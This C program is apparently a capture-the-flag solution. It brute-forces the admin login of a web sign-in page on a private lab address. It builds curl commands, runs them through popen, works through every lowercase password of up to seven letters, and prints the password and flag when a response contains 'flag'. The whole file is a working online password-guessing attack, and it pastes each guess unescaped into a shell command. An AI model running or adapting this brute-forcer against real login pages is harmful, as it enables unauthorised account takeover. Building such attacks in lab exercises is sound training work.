#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

char	*begin = "curl -s http://192.168.56.102/?page=signin -G -d 'username=admin' -d 'password=";
char	*end = "' -d 'Login=Login#'";
char	address_buffer[2000];
size_t	len;
char	path[1035];
char	password[8];
char	retbuffer[3000];

void		do_instruction(void)
{
	FILE *fp;

	fp = popen(address_buffer, "r+");
	if (fp == NULL) {
		printf("Failed to run command\n" );
		exit(1);
	}

	while (fgets(retbuffer, sizeof(retbuffer), fp) != NULL) {
		if (strstr(retbuffer, "flag") != NULL)
		{
			printf("password is : %s\n", password);
			printf("flag value is : %s", retbuffer);
		}
	}
	pclose(fp);
}

void		do_address(void)
{
	strcpy(address_buffer + len, password);
	strcat(address_buffer + len, end);
}

int		increment_password(int index)
{
	if (index == 7)
		return 0;
	else if (password[index] == 'z')
	{
		password[index] = 'a';
		return (increment_password(index + 1));
	}
	else if (password[index] == 0)
	{
		password[index] = 'a';
		return (1);
	}
	else
	{
		password[index]++;
		return (1);
	}
}

int			main(void)
{
	bzero(path, sizeof(path));
	bzero(retbuffer, sizeof(retbuffer));
	bzero(password, sizeof(password));
	/* Open the command for reading. */
	strcpy(address_buffer, begin);
	len = strlen(begin);
//	strcpy(password, "shadow");


	while (increment_password(0) != 0)
	{
		do_address();
		do_instruction();
		printf("%s\n", password);
	}	


//	do_address();
//	printf("%s\n", address_buffer);
//	do_instruction();
	return 0;
}
